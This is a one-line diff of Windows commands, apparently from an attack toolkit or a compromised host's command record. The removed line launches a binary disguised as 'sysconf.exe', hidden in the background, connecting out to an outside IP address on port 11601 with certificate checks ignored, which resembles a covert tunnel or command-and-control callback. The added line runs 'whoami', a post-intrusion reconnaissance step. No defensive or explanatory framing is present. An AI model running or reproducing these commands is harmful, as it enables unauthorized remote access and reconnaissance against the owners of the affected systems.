@@ -1,1 +1,1 @@
-cmd.exe /c start "" /B "C:\Users\Administrator\Documents\sysconf\sysconf.exe" -connect 104.194.215.10:11601 -ignore-cert
+cmd.exe /c whoami
